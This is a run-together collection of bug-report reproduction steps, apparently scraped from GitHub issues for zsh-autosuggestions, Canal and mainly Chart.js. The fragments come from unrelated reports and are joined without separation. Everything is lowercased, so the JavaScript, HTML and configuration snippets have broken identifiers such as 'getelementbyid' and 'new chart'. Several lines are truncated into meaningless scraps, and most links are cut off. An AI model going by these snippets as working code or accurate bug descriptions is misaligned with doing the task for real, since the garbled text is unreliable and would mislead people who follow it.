% zsh_autosuggest_partial_accept_widgets=( forward-char vi-forward-char forward-word emacs-forward-word vi-forward-word vi-forward-word-end vi-forward-blank-word vi-forward-blank-word-end vi-find-next-char vi-find-next-char-skip
% source path/to/zsh-autosuggestions.zsh
* i get `ource path/to/zsh-autosuggestions.zsh` as a suggestion.
i press right arrow to accept the first character of the suggestion
* the whole line gets accepted.
% source path/to/zsh-autosuggestions.zsh
% export term=xterm-256color
% git status
% git log --graph --pretty=format:'%cred%h%creset -%c(yellow)%d%creset %s %cgreen(%cr) %c(bold blue)<%an>%creset'
% source path/to/zsh-autosuggestions.zsh
% autoload compinit && compinit # load completion widgets
% source path/to # then hit alt+/ to execute _history-complete-older
prepare a clean `.zshrc`, include only `zsh-augosuggestions` widget and enable vi keybinding map : ```
source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh
start a fresh new terminal, prepare a dummy script: ```bash
touch here-is-a-test-script.sh
run this dummy script at least once to get it in the history: ```bash
./here-is-a-test-script.sh .zsh/zsh-autosuggestions
now start type 'he' to see the suggestion provided as below: ![show-suggestion]( 5
press `tab` to complete script command part: ![waiting-for-input]( - now, after step 5, if i press `esc` and immediately following by `l` (vi-forward-char)
the "space" between script and its argument is missing: ![missing-space]( - again with another approach, after step 5, if i press `esc` and wait for a second, then pressing `l` (vi-forward-char)
the output now looks correct: ![correct]( it could be some race condition? not sure, please help to check.
% source path/to/zsh-autosuggestions.zsh
% ls foo # then hit c-w followed by c-y
start command with space, e.g
`_echo '1'` where `_` means space
paste text, starting with space, e.g
move cursor to the right(right arrow) expected: have pasted text only
actual: pasted and previous command from 1.
start 2 terminals: terminal1 and terminal2
write a command in terminal1 e.g
`vim test`.
type `vi` in terminal2
terminal2 won't suggest `vim test`
if i run `history` in terminal2 the autosuggestion works fine.
![image](
- type until a suggestion is shown
- paste a path or similar from clipboard
- press right key to go to end of inserted selection
- see that the suggestion previous to pasting text is inserted.
i tried w/ ``` % zsh -df
mark-desktop% source ~/.zplug/repos/zsh-users/zsh-autosuggestions
``` but i don't get suggestions at all if i load the plugin this way so i dunno
it's fast when i comment out this plugin from my `~/.zshrc` and then slow when i enable it.
% source path/to/zsh-autosuggestions.zsh
% zsh_autosuggest_strategy=(completion)
% source path/to/zsh-autosuggestions.plugin.zsh
% zsh_autosuggest_highlight_style="fg=#4f0000"
% source path/to/zsh-syntax-highlighting.plugin.zsh
i'm using my koopa bootloader:
-
- any advice on how to debug this? i'm working through my scripts using the recommended `zsh -df` approach, sourcing the plugin manually, then adding back my scripts on top
% source "${zsh_plugins_dir}/zsh-autosuggestions/zsh-autosuggestions.zsh"
on raspberry (jessie) do as follows:
install `zsh-autosuggestions` plugin for `oh-my-zsh` using command bellow: ```shell
git clone ${zsh_custom:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions
add `zsh-autosuggestions` to plugins section in `~/.zshrc` and do `source ~/.zshrc`
restart the terminal and a warning saying `[oh-my-zsh] plugin 'zsh-autosuggestions' not found` is displayed
check the `~/.oh-my-zsh/custom/plugins` and `~/.oh-my-zsh/plugins` directories.
% source path/to/zsh-autosuggestions.zsh
% source path/to/zsh-syntax-highlighting.plugin.zsh
% export wordchars='*?_[]~=&;!#$%^(){}'
% cd test1/test2
now, input `cd` and continuously use `zsh_autosuggest_partial_accept_widgets` until the end of the line
instead of get the complete `test1/test2`, the `test2` part will be duplicated.
% source ~/.../zsh-autosuggestions.zsh
% bindkey -v
% s<cursor>ource ..
# use right-arrow/vi-forward-char, bell is triggered
% bindkey -e
% s<cursor>ource ..
# use right-arrow/forward-char, bell is not triggered
tmout=1 trapalrm() { source $path_to_plugin/zsh-autosuggestions.plugin.zsh
in an ubuntu 18.04 system, following [the instructions linked in the install.md](
$ wget -nv -o release.key
2019-10-16 09:21:17 url: [1110/1110] -> "release.key" [1]
$ sudo apt-key add release.key
$ sudo apt-get update
ign:8 inrelease
hit:9 release
err:13 release.gpg the following signatures were invalid: expkeysig 767b5f350f20116f shells:zsh-users obs project <shells:zsh-users@build.opensuse.org>
reading package lists..
done building dependency tree
reading state information..
all packages are up to date.
w: an error occurred during the signature verification
the repository is not updated and the previous index files will be used
gpg error: release: the following signatures were invalid: expkeysig 767b5f350f20116f shells:zsh-users obs project <shells:zsh-users@build.opensuse.org>
w: failed to fetch the following signatures were invalid: expkeysig 767b5f350f20116f shells:zsh-users obs project <shells:zsh-users@build.opensuse.org>
in st terminal emulator with the default config from regolith-linux, the autocomplete only works for the character under the cursor
with the gnome-terminal on the same machine the plugin works.
- set `zsh_autosuggest_highlight_style` in `~/.zshrc` ```
export zsh_autosuggest_highlight_style="fg=gray"
export zsh_autosuggest_highlight_style="fg=#dcdcdc"
(two mutually exclusive examples - only one of them is used at one time) - open new terminal
- the autosuggestion is the same color as the already-typed characters
canal admin anal.properties ```properties canal.admin.manager = 10.100.12.12:8089 canal.instance.global.mode = manager canal.instance.global.spring.xml = classpath:spring/default-instance.xml # nstance pring.xml canal.instance.shop-item.spring.xml = classpath:spring/group-instance.xml # k canal.destinations = shop-item ``` 2
nstance
set history binlog position in meta.log(or other style)
start canal
wait for local binlog mode exist
step in the code
![bugfix](
create table t (data json);
insert into t values ('null');
insert into t values ('null');
insert into t values (null); ```
mysql> insert into t values ('null');
error 3140 (22032): invalid json text: "invalid value." at position 0 in value for column \'t.data\'.
ello uniya4
ame,value,id
ame alue d d ame alue d frist d,name,value
,a,aaa => (aaa,1,a) ; name alue d afka d=aaa base
opic
.0.3 .1.1 .1.2, ysql ocker ing
[fiddle here](
as you can see in the console log, the scales object post-render is much different.
please, pay attention to the comment within `options.plugins`:
unfortunately i don't know how i could prepare a better demonstration.
live example:
repo with code
"stats.js" is likely where the bug exists
code seems to be set correctly for the chart
data is making it there as expected in as object/s in an array
attempt to add more than one exercise to a single workout
you'll find that it will not display on the dashboard which has chart.js setup
if adding one exercise per workout, data displays correcly
when you attempt to add more than one exercise to workout, it only displays one, despite having the correct data needed.
codepen:
codepen:
``` javascript
var ctx = document.getelementbyid("mychart").getcontext("2d");
var doughnut = { type: "doughnut", options: { responsive: true, responsiveanimationduration: 0.0, aspectratio: 1.4, maintainaspectratio: true, title: { display: true, position: 2, fontsize: 50.0, fontcolor: "#666", fontstyle: "bold", padding: 20.0, lineheight: 1.2, text: "yesterday cost analysis", }, animation: { duration: 0.0 }, layout: { padding: { left: 0.0, right: 0.0, top: 0.0, bottom: 0.0 } }, legend: { display: true, position: "bottom", align: "center", fullwidth: true, reverse: false, labels: { boxwidth: 80.0, fontsize: 25.0, fontstyle: "bold", fontcolor: "#666", padding: 50.0, }, }, scales: null, }, data: { labels: [ ["compute", "cloud", "compute"], ["load", "balancing"], ["relational", "database", "service"], ], datasets: [ { label: "", data: [61.13, 0.0, 0.0], backgroundcolor: [ "rgba(255, 99, 132, 0.8)", "rgba(255, 206, 86, 0.8)", "rgba(54, 162, 235, 0.8)", "rgba(75, 192, 192, 0.8)", "rgba(153, 102, 255, 0.8)", "rgba(255, 159, 64, 0.8)", ], bordercolor: [ "rgba(255, 99, 132, 0.8)", "rgba(255, 206, 86, 0.8)", "rgba(54, 162, 235, 0.8)", "rgba(75, 192, 192, 0.8)", "rgba(153, 102, 255, 0.8)", "rgba(255, 159, 64, 0.8)", ], borderwidth: 1.0, }, ], },
}; var chart = new chart(ctx, doughnut);
run "bower install" with 2.9.4 release as a dependency
here is my screenshot
you can see i have some data they have same timestamp
it works well with line chart but bar chart not generating if you go to line number 39 and you will see values are like this
data:[{time: "15 oct 22:45", value: 0.48}, {time: "15 oct 22:45", value: 0.48}, {time: "15 oct 22:49", value: 0.15}]
so if i change 2nd item to 15 oct 22:47 or any other value
run `gulp docs` on node v12.18.4
create an x axis label array with a few values, e.g
`labels = ['january','february','march']`
create a data series using `format: 'point'` and with the data having fewer points than the x axis labels, e.g
`data = [{x: 'march', y: 10}]`
reproduction exmaple
this happened when i used
options: { // removes the curve elements: { line: { tension: 0 } },
live bug demo:
* make a new folder
* `npm init`
* `npm install chart.js --save`
* look in the node_modules folder, see that moment has been installed
* look at the source code in node_modules/chart.js/dist/chart.min.js, see `require("moment")`
open the example link on chrome and safari and run it
you should see the difference between them.
remove the `offset` property (on line 130)
using chrome you shouldn't see the first and last bar
using safari or firefox, it will disappear only the last one and the gap will be smaller.
remove `distribution` property (on line 131)
it should work on chrome but not on safari or firefox
[
here is click several times on 'randomize data' data
when the **toggle=true** the graph is drawn as expected, but when it becomes false then the background is still present(works fine is showline=false initially and chart is not updated)
set a tooltip `mode` to `'x'` and `intersect` to `false`
add a `label` callback to the tooltip `callbacks` to render the labels
hover over the chart at different x points.
`label` callback sometimes doesn't get triggered for certain datasets at different x points so the labels don't get rendered to the tooltip
hover on the first bar for a second
without delay hover over the second bar and also without delay on the third (you can hover back and forth between bars 2 and 3).
if you will do a delay over the second bar, the issue won't happen
also in you don't do a delay over the first bar the issue won't happen.
i created a codepen with a code example, but sadly it doesn't show the maximum call stack error
anyway, you can easily reproduce the error copying the code on a local project and get the error in the console
to reproduce, use the sample created by @kurkle for the other issue:
navigate to any tooltip example on mobile phone and tap on any data point.
you will see a tooltip
then tap outside of canvas and you will see that tooltip stays on a screen.
example code at [
link to reproduce
[stack blitz](
go to
browser zoom out so the cavnas is small
reload page so the canvas renders in tiny size
now zoom in the browser and observe blurry stretched canvas
hide and show dataset(s) repeatedly, for example in: example results:
![image](
var data = linearchartdata(labels: ['a','b','c'], datasets: <chartdatasets>[ chartdatasets( label: gtitle, backgroundcolor: 'rgba(20,20,255,0.2)', bordercolor: 'rgba(20,20,255,0.5)', borderwidth: 1, hoverbackgroundcolor: 'rgba(20,20,255,0.9)', data: [2,6,5], fill: false, hoverbordercolor: 'navy', linetension: 0.00001, pointradius: 5 ) ]); var title = charttitleoptions(text: 'votos x setor', fullwdith: true, display: false); var config = chartconfiguration( type: typegraph, data: data, options: chartoptions(maintainaspectratio: true, title: title, responsive: true, legend: chartlegendoptions(display: true, position: 'right'))); chart(canvaselement, config); ```
go to import and register the legend plugin
![buglegend1](
see the browser console log.
try to create a bar chart without registering the categoricalscale first.
you can have a look to browser console
set animation.duration: 0 in the config => dataset stays visible after click
set animation.duration: >0 in the config => datasets visibility can be changed
(click `magic` and notice that the y-axis scale doesn't change)
see [jsbin](
set the tooltip background to white:
``` tooltips: { backgroundcolor: '#fff', bordercolor: '#ccc', borderwidth: 1, titlefontcolor: '#333', bodyfontcolor: '#333', footerfontcolor: '#333' }
(for bugs)
(for bugs) interactive example:
the extraneous gridline is immediately visible upon loading the interactive example.
follow code example from
please check it here:
[
use `options` as on provided example.
[
[
create a detached parent node.
attach canvas to that parent node made in step 1.
create chartjs object with the canvas made in step 2, using multiple y-axis.
move the timeline (or use hotkeys arrowleft and arrowright), which will cause an animated update of the chart
then move the mouse to hover over the chart before animation completes
every mouse movement will cause the animation to restart, leading to an extremely jerky appearance if you're dragging a mouse across the chart as it happens.
(for bugs) use a bootstrap 3.4.1 site template with top and side nav bars and dump your <"canvas">s inside <"div class="row"">s and <"div class="col-sm-12"">s .row.content {height: 550px} this causes the charts to not animate if the window height is larger than xx
[here is a sandbox to review](
(for bugs) v3.0.0-alpha:
```javascript
var point =
function (_element) { _inherits(point, _element); function point(cfg) { var _this; _classcallcheck(this, point); _this = _possibleconstructorreturn(this, _getprototypeof(point).call(this)); _this.options = undefined; _this.skip = undefined; _this.stop = undefined; if (cfg) { _extends(_assertthisinitialized(_this), cfg); } return _this; }
``` master: ```javascript
var point = function (_element) { _inherits(point, _element); var _super = _createsuper(point); function point(cfg) { var _this; _classcallcheck(this, point); _this = _super.call(this); _this.options = undefined; _this.skip = undefined; _this.stop = undefined; if (cfg) { _extends(_assertthisinitialized(_this), cfg); } return _this; }
(for bugs)
here is the html
` < div class="card card-style mb-1"> < div class=\'content\'> < h1 class="text-center mb-0">my renewals</h1> < canvas id=\'renchart\' width=\'250px\' height=\'120px\'></canvas> < /div> < /div>
and the script
var mct2 = document.getelementbyid("renchart").getcontext("2d"); mchart2 = new chart(mct2, { type: \'line\', data: { labels: [\'aug\', \'sep\', \'oct\', \'nov\', \'dec\', \'jan/20\'], datasets: [{ data: [55, 57, 57, 58, 61, 62], label: \'me\', bordercolor: "#19bc9c", fill: false }, { data: [81, 81, 81, 81, 81, 81], label: \'goal\', bordercolor: "#f05b4f", fill: false }, { data: [65, 65, 69.5, 73, 76.2, 76.5], label: \'team avg\', bordercolor: "#d3d3d3", fill: false } ] }, options: { legend: { display: false }, scales: { yaxes: [{ ticks: { min: 50, max: 100, callback: function (val) { return val + "%" } } }] }, plugins: { datalabels: { display: false } } } });
click to hide data set 'c' and you'll see a tiny blue line
it only happens for the last data set.
go to the [polararea sample]( and open the web console.
visit
by default 5 data series are displayed
add any other 8 data series
when adding the 13th data series, an error occurs
the precise error in the console is different for different browsers
in firefox, i get:
typeerror: "seq is null" chartdata vue.min.js:6:11752 in chrome, i get:
typeerror: cannot read property 'length' of null at wn.chartdata (chart:331)
open
(for bugs) 1
open attached codepen
click on legend item
notice nothing happens
convert the `onclick` legend option from an arrow function to a normal function
click on the legend
notice that it works
draw two points close enough and a hoverradius overlapping both points
it always marks the two points as marked, although it only shows the closest tooltip
this should mark only the closest
ajust the size of the result box at
see the following codepen:
above, version 2.9.3 is used
notice how there\'s a darker line where "jan" and "2020" meet on the x axes
in contrast, version 2.8.0 does not have this issue:
here you can see all grid lines are the same color.
go to: **browser zoom level 100%:** the line chart is blurry.
![]( **browser zoom level 125%:** the line chart is sharp.
![](
(for bugs) 1
pass options including `adapters.date` for a time scale.
change those options, and update the graph (changes are reflected properly).
change those options again, and update the graph (changes are not reflected after the first update)
in the example, notice that you can switch the timezone from utc to lst, but you cannot change it back: [codepen](
```javascript
class myconfigclass { constructor(parameter) { this._private_parameter = parameter; } getparameter() { return this._private_parameter; } } chart.plugins.register({ id: 'example', beforeinit: function(chartinstance, pluginoptions) { // expect: an instance of myconfigclass // actual: { _private_parameter: 'a value' } console.log(pluginoptions); }
}); const chart = new chart(document.queryselector("#chart"), { options: { plugins: { \'example\': new myconfigclass("a value") } }
[codepen](
trying different css options but it only happens in chrome
create a line chart with a few datasets and a visible x-axis.
set `options.legend.position` to `"right"` and `options.legend.align` to `center` values.
reduce chart height until the chart legend is higher than the actual chart.
some legend items are only partially visible and some are not clickable
this can be reproduced with different combinations of `options.legend.position` (left, right) and `options.legend.align` (center, start, end).
see example here:
it is using the bundled 2.9.3 version
the bug appears on all mobile browsers (chrome, firefox, and safari)
you can view it on ios or using to see the problem in action.
here is an example with a "valid" order
{x: [new date('2019-01-05'), new date('2019-01-06')], y: 'task 1'},
{x: [new date('2019-01-10'), new date('2019-04-10')], y: 'task 2'},
{x: [new date('2019-03-15'), new date('2019-06-10')], y: 'task 3'},
{x: [new date('2019-03-05'), new date('2019-03-08')], y: 'task 1'},
``` the bug occurs when changing the order of the entries in the dataset so that the two entries for "task 1" follow each other: ```
{x: [new date('2019-01-05'), new date('2019-01-06')], y: 'task 1'},
{x: [new date('2019-03-05'), new date('2019-03-08')], y: 'task 1'},
{x: [new date('2019-01-10'), new date('2019-04-10')], y: 'task 2'},
{x: [new date('2019-03-15'), new date('2019-06-10')], y: 'task 3'},
chart type is a bar chart
x axis has tick labels that (some) are multiple lines i will attach images displaying what currently happens and what i would like to achieve.
create a react project with chartjs npm dependency, and create a timeseries chart.
run npm build and serve the webpage
the bug should occur if momentjs is at 2.25.1.
re-building chart.js library causes the issue.
[bug demo](
<pre> <html> <head> <title>logarithmic line chart</title> <script src="chart-2.9.3.js"></script> <style> canvas { -moz-user-select: none; -webkit-user-select: none; -ms-user-select: none; } </style> </head> <body> <div style="width:75%;"> <canvas id="canvas"></canvas> </div> <script> var config = { type: \'line\', data: { labels: [\'1\', \'10\', \'100\', \'nan\', \'1000\'], datasets: [{ label: \'bug\', fill: false, data: [ 1, 10, 100, math.log(0), 1000, ] }] }, options: { responsive: true, title: { display: true, text: \'chart.js line chart - logarithmic\' }, scales: { xaxes: [{ display: true, }], yaxes: [{ display: true, type: \'logarithmic\', }] } } }; window.onload = function() { var ctx = document.getelementbyid(\'canvas\').getcontext(\'2d\'); window.myline = new chart(ctx, config); }; </script> </body> </html> </pre>
see [this jsfiddle](
click `hide` button first, then click `show` button, you'll see the chart will be missing.
here's [the same jsfiddle]( but with version 2.9.3, which doesn't have the bug.
![chartjs-point-animation](
use the sample
add datasets until x-axis starts skipping labels
the points now do not align with the tick labels anymore.
jsfiddle:
#external-custom-tooltips
jsfiddle to see working feature outside shadow dom :
jsfiddle to see broken feature inside shadow dom :
fiddle that reproduces the issue: if we remove `unit: 'month'`, the issue is gone.
if in generatedate we add "* 30" to generate monthly points instead of daily points, the issue is gone too.
see the following [jsfiddle]( in order to reproduce.
create linear chart with following configuration:
stepsize property should be value (max - min) / 5 (i expect to see 5 equal intervals) and, probably, both of max and min properties should not be exactly divisible by stepsize (in my case, 20/18 != integer value and 110/18 != integer value)
render a chart (pie, bar, line) and resize the window wildly
```javascript this.chartoptions = { responsive: true, maintainaspectratio: false, legend: false, };
``` i turned off animations globally:
```javascript global.animation = { duration: 0, }; global.hover = { animationduration: 0, }; global.responsiveanimationduration = 0;
generate your chart graphic
add to the container the css property: "zoom: 2;"
hover the different parts of the canvas to constat it's no sync anymore
problem seems to have originated in 2.9
as was working in 2.8 fine
since some rtl compatibility has been added
(i'm not asking for rtl)..
i haven't spotted anything in documentation or upgrade guide that says i should be doing anything differently in my config from `2.8` to `2.9.3` please help?
(for bugs)
just try to change the version of chart.js beteween the last and 2.7.3 to see the difference
[example on codepen](
[example showing `steppedline: middle` compared to `steppedline: before`](
see the fiddle
see the fiddle
checkout the fiddle
it's really apparent to test with the financial sample (after is merged) and time unit set to `'minute'`
there's a lot of blank space at the edge of the chart ![screenshot from 2020-02-08 09-03-42](
i was trying to reproduce the bug on codepen:
there i didn't get an exception, but an empty canvas instead.
create a line chart with a single dataset which contains around 45000 datapoints (x|y)
use linear axes type.
(for bugs) ```
<!doctype html>
<html> <head> <title>time scale point data</title> <style> canvas { -moz-user-select: none; -webkit-user-select: none; -ms-user-select: none; } </style>
</head> <body> <div style="height: 400px; width:500px;"> <canvas id="mycanvas" style="height: 400px; width:500px;"></canvas> </div> <br> <script> function.prototype.bind = function.prototype.bind || function (thisp) { var fn = this; return function () { return fn.apply(thisp, arguments); }; }; </script> <script src=" "></script> <script src=" "></script> <script> var chartcolors = { red: \'rgb(255, 99, 132)\', orange: \'rgb(255, 159, 64)\', yellow: \'rgb(255, 205, 86)\', green: \'rgb(75, 192, 192)\', blue: \'rgb(54, 162, 235)\', purple: \'rgb(153, 102, 255)\', grey: \'rgb(231,233,237)\' }; var color = chart.helpers.color; var config = { type: \'line\', data: { datasets: [ { label: \'dataset with string point data\', backgroundcolor: color(chartcolors.red).alpha(0.5).rgbstring(), bordercolor: chartcolors.red, fill: false, data: [{ x: 1485903600, y: 120.2 }, { x: 1486210600, y: 110.8 }, { x: 1487384000, y: 90 }, { x: 1488738400, y: 150 }] } ,{ label: \'dataset with date object point data\', backgroundcolor: color(window.chartcolors.blue).alpha(0.5).rgbstring(), bordercolor: window.chartcolors.blue, fill: false, data: [] } ] }, options: { responsive: true, title: { display: true, text: \'chart.js time point data\' }, scales: { xaxes: [{ type: \'time\', display: true, scalelabel: { display: true, labelstring: \'date\' }, ticks: { major: { fontstyle: \'bold\', fontcolor: \'#ff0000\' } } }], yaxes: [{ display: true, scalelabel: { display: true, labelstring: \'value\' } }] } } }; var ctx = document.getelementbyid(\'mycanvas\').getcontext(\'2d\'); new chart(ctx, config); </script>
</body> </html>
``` steps to reproduce:
save the html in the **testchartjs.html**
convert: type testchartjs.html | wkhtmltopdf.exe --print-media-type --margin-top 0mm --margin-bottom 0mm --margin-right 0mm --margin-left 0mm --debug-javascript --javascript-delay 5000 --log-level error - testchartjs.pdf
open the pdf document and check that the charts are not displayed
here is the codepen example :
i have set min value in y axis as 50000 , and values below 50000 are not getting plotted.
this can be seen in the same jsfiddle than my other bug #6985: 1
open
see that there is no animation at first load
change chart.js version from master to latest and click run
see that there is an animation
(for bugs) 1
go to
at first run, filling is ok
click "update chart" button until the issue happens ![screenshot_20200119_112740](
- v.2.9.3:
![image]( - v.2.8.0:
![image]( - v.2.7.3:
![image](
implement a chart using custm tooltips:
to trigger the bug, you must move the mouse to any point and wait for the point animation to finish (-> 1s)
then quickly move the mouse between other points and the first one will flicker
the key is to move quickly enough to not let any animations finish
## possible solution
the only thing i can do right now is to disable hover animations, but that is sad because the animations are awesome <3:
`chart.defaults.global.hover.animationduration = 0;`
with chart.js v2.9.0, use the following config
i used [this sandbox]( for example
just swap the package.json chart.js version between 2.9.0 and 2.7.3
new chart(ctx, { type: "line", data: { labels: ["j", "f", "m", "a", "m", "j", "j", "a"], datasets: [ { backgroundcolor: "#018bbb", bordercolor: "#979797", borderwidth: "1", data: [450, 422, 502, 497, 517, 512, null, null], fill: "transparent", label: "actual" }, { bordercolor: "#10bd1b", borderwidth: "1", data: [700, 700, 700, 700, 700, 700, 700, 700], fill: "transparent", label: "target", pointradius: 0 } ] }, options: { legend: { display: false }, scales: { xaxes: [ { gridlines: { color: "transparent" } } ], yaxes: [ { gridlines: { color: "transparent" }, position: "right", ticks: { max: 700, min: 422, stepsize: 278 } } ] } }
<html> <body> <div class="mychartdiv"> <canvas id="mychart" width="600" height="400"></canvas> </div> </body>
var ctx = document.getelementbyid("mychart");
var mychart = new chart(ctx, { type: \'line\', data: { labels: ["red", "blue", "yellow", "green", "purple", "orange"], datasets: [{ label: \'# of votes\', data: [12, 19, nan, 5, 2, 3] }] }, options: { scales: { yaxes: [{ type: \'logarithmic\', ticks: { beginatzero:true } }] } }
``` using `spangaps` has no effect
there is no bug when `type: 'logarithmic',` is removed: ![image](
this is the issue:
the first one gets display correctly, but the second one bugs out.
just hover over one of the two middle points and you'll see what i mean:
(for bugs)
(for bugs)
copy / paste code from the first fiddle with the 2.3.0 version of chart.js and then update it to the latest.
please run this fiddle:
click `removedataset`, click `adddata`
(error in console)
(for bugs) ```
<!doctype html>
<head><meta http-equiv="content-type" content="text/html; charset=utf-8"> <script src=" "></script>
<body> <div><canvas id="canvas"></canvas></div> <script> window.onload = function() { var chart = new chart(document.getelementbyid(\'canvas\').getcontext(\'2d\'), { "type": "line", "data": { "datasets": [ { "backgroundcolor": "green", "bordercolor": "red", "data": [ 2,2,2,2,2 ], "fill": false, "hoverborderwidth": 5, "label": null, "pointborderwidth": 0, "pointradius": 4, "showline": false, "type": "line" }, { "backgroundcolor": "yellow", "bordercolor": "blue", "data": [ 3,3,3,3,3 ], "fill": false, "hoverborderwidth": 5, "label": null, "pointborderwidth": 0, "pointradius": 4, "showline": false, "type": "line" } ], "labels": [ 1,2,3,4,5 ] } }); }; </script>
(for bugs) open on safari and try to hover one of the bars on the chart to get the tooltip, this causes a crash and reload of the browser page
- safari 13.0.3, mojave 10.14.6
- safari 11.0.3, sierra 10.12.6
(for bugs) <details>
<summary>click here to expand and see the example code used for the images above.</summary> ```html
<!doctype html>
<head><meta http-equiv="content-type" content="text/html; charset=utf-8"> <script src=" "></script>
<body> <div><canvas id="canvas"></canvas></div> <script> window.onload = function() { var chart = new chart(document.getelementbyid(\'canvas\').getcontext(\'2d\'), { type: "scatter", data: { datasets: [{ bordercolor: \'red\', data: [{x:-5,y:5},{x:-4,y:6},{x:-3,y:7},{x:-2,y:6},{x:-1,y:8},{x:0,y:9},{x:1,y:10},{x:2,y:9},{x:3,y:6},{x:4,y:7},{x:5,y:8}], fill: false, showline: true, }] }, options: { legend: { display: false }, scales: { yaxes: [{ position: \'left\', id: \'y-axis-0\', ticks: { suggestedmax: 11, suggestedmin: 4, }, }, { position: \'right\', id: \'y-axis-1\', ticks: { suggestedmax: 11, suggestedmin: 4, }, }] } } }); }; </script>
``` </details>
here is a simplified code of the error that can be reproduced.
in this example, stacked option set as stacked:false, so we shouldn't see any stacked chart
but it's stacked
also in this view, first dataset usage is not calculated correctly
![image]( ![image](
for example:
same example, with same points, but in negative side of y axis:
pay attention on "blue" and "green" point for data set "# of apples"
here is a [fiddle](
i have increased `pointhitradius` to show this
in our charts, the radius is set to default.
codepen links above, see console.log for both code pens.
using the chart.js [sample]( 1
hide a data of pie chart by legend 1
click on "add dataset" button
(for bugs) angular example - open (
- open console logs.
- click on `chart one` tab
animation rendering stops at 3% the component `<app-chart>` is rendered only after the `chart one` tab is selected - you can verify this by checking the logs for `ngafterviewinit` event
so, the animation is **not** happening in the background as soon as the page opens (when on `home` tab)
therefore, this is **not** the reason why the animation is not being seen/rendered
the issue is beyond this
the chart is rendered and animation starts only after user clicks on the `chart one` tab
you can verify this by checking the console logs
yet, the animation stops at 3% and the user doesn't see the animation
moreover, i've set the animation duration as `5000` (for testing), yet it doesn't animate for even for 1 second
same behavior even if i don't set the animation duration to anything (defaults)
i feel there's something that's interrupting the animation and abruptly rendering the chart
**update:** if i render the chart using a settimeout of 500ms, the animation loads correctly
you can see this behavior in the `chart two` tab
however, i want to avoid this since it leads to a slightly bad user experience.
look at any published sample chart with an ie11 browser.
(for bugs) minify chart.js with "bundler and minifyer" under visual studio 2019 community edition.
run the following url in microsoft edge 44.18362.387.0:
just connect to : with edge
(for bugs) 1
clone
`npm install`
open index.html by browser.
see
when the same setup is run in v2.8.0 the fill is correct.
(for bugs) <details>
<summary>click here to expand and see the example code used for the images above.</summary> ```html
<!doctype html>
<head><meta http-equiv="content-type" content="text/html; charset=utf-8"> <script src=" "></script>
<body> <div><canvas id="canvas"></canvas></div> <script> window.onload = function() { chart.scatter(document.getelementbyid(\'canvas\').getcontext(\'2d\'), { data: { datasets: [{ bordercolor: \'red\', data: [{x:-5,y:5},{x:-4,y:6},{x:-3,y:7},{x:-2,y:6},{x:-1,y:5},{x:0,y:4},{x:1,y:3},{x:2,y:2},{x:3,y:5},{x:4,y:7},{x:5,y:9}], fill: false, showline: true, borderwidth: 20, pointradius: 0, }] }, options: { legend: { display: false }, scales: { xaxes: [{ ticks: { min: -2, max: 3 } }] } } }); }; </script>
``` </details>
(for bugs) 1
open the sample for a non numeric y axis
notice that only one point shows
view the [v2.8.0]( sample and notice that it works
can be reproduced on
put the mouse cursor on a line point, then move the mouse left along the line
you will notice that the first hovered point flickers instead of disappearing smoothly.
(for bugs) change `type` to `horizontalbar` in the default codepen:
yaxes > gridlines > display: currently i set to false, even if set to true, it doesn't help.
yaxes > gridlines > zerolinewidth: change to anything u like
this is what i have
`this.renderchart({ datasets: [ { backgroundcolor: [this.gradient, '#ece8e5'], data: [200, 160], borderwidth: 0, weight: 10 }, { backgroundcolor: ['transparent', 'transparent'], data: [360], borderwidth: 0, weight: 1 }, { backgroundcolor: ['#0b3f54', 'transparent'], data: [230, 130], weight: 2 } ], options: { responsive: true, events: [], cutoutpercentage: 60, tooltips: { enabled: false }, hover: { mode: null } } })` this does not work
if i add chart.defaults.global.tooltips.enabled = false the tooltips are removed, but chart.defaults.global.hover.mode = null does not stop hover.
(for bugs) * i turned off animations
`duration: 0`
* chart is only instantiated once.
* canvas-element is only rendered once.
* data is not changed in the meantime nor mutated.
* chart is just freshly created, never `update`ed.
if you change the pc time zone to "utc+12 auckland", the "2019-09-29t02:00:00" is not showing in the chart.
![image]( but if you change the time zone to "utc+12 fiji", it is showing correctly
![image](
create a stacked bar chart with data, filter the visible data by selecting an option in the legend, then update the table.
add type: 'time' to xaxes:
open jsfiddle (
open console
click on a data (eg the blue one)
see in the console: array (1)
click on a label, eg: "blue"
see in console: []
upgrade to ie 11.950.....
compose a sample code
<!doctype html><html><head> <title>pie chart</title> <script src=" "></script> <style type="text/css">/* chart.js */
<body> <button onclick="showchart()">show</button> <div id="canvas-holder" style="width:40%"> <canvas id="chart-area" style="display: block; width: 762px; height: 381px;" width="762" height="381"></canvas> </div> <script> var chart; var config = { type: \'pie\', data: { datasets: [{ data: [1,2,3,4,5], backgroundcolor:[\'rgb(123,34,243)\',\'rgb(123,34,243)\',\'rgb(123,34,243)\',\'rgb(123,34,243)\',\'rgb(123,34,243)\'], label: \'dataset 1\' }], labels: [\'red\',\'orange\',\'yellow\',\'green\',\'blue\'] } }; function showchart(){ var ctx = document.getelementbyid(\'chart-area\').getcontext(\'2d\'); chart = new chart(ctx, config); } </script>
</body></html>
run in chrome, edge and ie 11.950......, both chrome and edge work except ie
(for bugs) see:
<
(for bugs) < if `width: 400px; height: 200px; ` then no tooltips values are given
when hover over bar's
but if `height: 210px`, then works like
it should work
same problem allways when `width/height==2`.
also helps to change container width something else than 100%
< (version 2.8.0)
try to move mouse from left to right and from right to left and observe the difference in active point highlighting
note that tooltip is updated as expected.
[codepen]( try to see the tooltip for axis 1, axis 2 and axis 3 on the origin.
hover over any pink point, a green point to the left is also selected
here is the example : stack group 2 (current month data) should start with 1 (as reported by lable) and so for the other current month dates.
check [jsbin](
see js bin [here](
can't seen to coerce the ticks to misbehave in a specific codepen, but it is affecting our software here: [carta-frontend/#433](
this is a working example of this bug:
visit the jsfiddle link that is provided below.
(for bugs)
(for bugs) [this codepen shows the results of both types of backgroundcolor implementations.](
(for bugs) simply try to set the fontsize of the `legend.labels`-subkey to a string-number, e.g
`"12"`, instead a number as `12`
here's my current (working) configuration using `parseint`: ```javascript
let cfg = { 'type': graph.type, 'data': { 'datasets': datasets, 'labels': labels }, 'options': { // omitted options ..
// legend options 'legend': { 'labels': { 'fontsize': parseint(graph.fontsize), // we need to force integer here 'fontfamily': graph.fontfamily } }, // title options 'title': { 'fontfamily': graph.fontfamily, 'fontsize': graph.fontsize // no need to explicitly force an integer here } // ..
other omitted options } }
toggle the dataset on and off through the label to see what it should look like on load.
hover any chart element
move cursor out of chart
